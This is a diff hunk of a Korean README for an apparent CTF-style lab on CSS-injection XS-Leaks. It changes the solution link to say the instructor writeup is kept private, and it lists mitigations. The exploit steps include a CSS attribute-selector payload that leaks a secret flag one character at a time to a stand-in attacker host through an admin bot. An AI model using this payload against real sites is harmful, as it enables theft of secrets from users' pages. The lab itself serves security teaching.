@@ -23,7 +23,7 @@ make up-client   # 또는: docker compose up -d --build xsleak bot platform
 3. `input[id=secret][value^="flag{a"]{background:url(//attacker/leak?c=a)}` 식으로 접두사 brute → 한 글자씩 누출.
 4. 신고로 admin 봇 방문 반복.
 
-> 참조 풀이: [`solution/writeup.md`](solution/writeup.md)
+> 참조 풀이(강사용)는 비공개 레포에서 별도 관리한다 — 공개 레포에는 포함하지 않는다.
 
 ## 대응방안
 사용자 입력을 style 컨텍스트에 넣지 않기, CSP(style-src), 민감값을 DOM 속성에 두지 않기.
